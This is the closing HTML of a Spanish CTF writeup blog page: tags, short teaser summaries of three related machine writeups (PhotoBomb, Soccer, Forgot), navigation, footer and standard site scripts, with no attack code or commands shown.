class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/commandinjection/">CommandInjection</a> <a class="post-tag" href="/tags/sudoers/">Sudoers</a> <a class="post-tag" href="/tags/cache-deception/">Cache Deception</a> <a class="post-tag" href="/tags/cracking-passwords/">Cracking Passwords</a> <a class="post-tag" href="/tags/cracking/">Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/writeup-PhotoBomb/"><div class="card-body"> <em class="small" data-ts="1669698000" data-df="DD/MM/YYYY" > 29/11/2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PhotoBomb Writeup</h3><div class="text-muted small"><p> En esta máquina veremos un information leakage para ver credenciales, inyectaremos comandos a través de una petición en la información de una descarga y haremos un Pathhijacking para convertirnos e...</p></div></div></a></div><div class="card"> <a href="/posts/writeup-Soccer/"><div class="card-body"> <em class="small" data-ts="1671426000" data-df="DD/MM/YYYY" > 19/12/2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Soccer Writeup</h3><div class="text-muted small"><p> En esta máquina veremos cómo podemos subir un archivo en php para ejecutar comandos de manera remota, vemos cómo podemos en base a una SQL Injection y con un websocket podemos ver la base de datos ...</p></div></div></a></div><div class="card"> <a href="/posts/writeup-forgot/"><div class="card-body"> <em class="small" data-ts="1668834000" data-df="DD/MM/YYYY" > 19/11/2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Forgot Writeup</h3><div class="text-muted small"><p> En esta máquina veremos un “Host Header attack” para pasar un panel de login. Luego un “web cache deception” para obtener acceso como usuario no privilegiado en la web. Por último abusamos del priv...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/writeup-forgot/" class="btn btn-outline-primary" prompt="Anterior"><p>Forgot Writeup</p></a> <a href="/posts/writeup-PhotoBomb/" class="btn btn-outline-primary" prompt="Nuevo"><p>PhotoBomb Writeup</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/commandinjection/">CommandInjection</a> <a class="post-tag" href="/tags/sudoers/">Sudoers</a> <a class="post-tag" href="/tags/cache-deception/">Cache Deception</a> <a class="post-tag" href="/tags/cracking-passwords/">Cracking Passwords</a> <a class="post-tag" href="/tags/cracking/">Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/AngelMiguel3023">miguel3023</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Hecho con <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> usando el tema <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> .</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p><button type="button" class="btn btn-primary" aria-label="Update"> Actualizar </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
